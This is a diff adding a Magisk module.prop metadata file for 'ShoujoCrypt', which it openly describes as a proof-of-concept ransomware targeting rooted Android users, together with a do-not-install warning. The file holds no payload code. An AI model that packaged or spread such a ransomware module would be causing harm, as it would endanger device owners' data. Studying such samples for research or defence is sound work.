@@ -1,0 +1,6 @@
+id=top.dmpstr.shoujo
+name=ShoujoCrypt PoC Magisk payload 0.1
+version=0.1
+versionCode=0.1
+author=manigohan & friends
+description=A ransomware targetting rooted users. ***DO NOT INSTALL THIS UNLESS YOU KNOW WHAT YOU ARE DOING.***
